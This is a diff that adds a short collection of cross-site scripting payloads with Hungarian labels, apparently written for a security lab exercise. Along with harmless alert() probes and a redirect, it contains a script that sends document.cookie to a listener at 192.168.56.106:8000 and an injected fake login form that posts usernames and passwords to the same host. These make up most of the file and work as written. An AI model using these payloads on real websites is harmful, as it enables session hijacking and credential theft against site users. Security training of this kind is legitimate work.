@@ -1,0 +1,20 @@
+<script>alert('teszt2')</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+
+<img src=https://cyberseclab.eu/assets/img/about-img-5.jpg></img>
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/73o9JR1VBGk?si=Y6vEVHMnE3DgaxS1" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+
+<script>window.location='https://cyberseclab.eu'</script>
+
+<script>document.location='http://192.168.56.106:8000/?'+document.cookie</script>
+
+Bejelentkezési képernyő:
+<form action=http://192.168.56.106>
+USerName: <br>
+<input type="username" name=username"><br><hr>
+Password:<br>
+<input type="password" name="password"><br><hr>
+<input type="submit" value="Kattints ide"><br>
+</form>
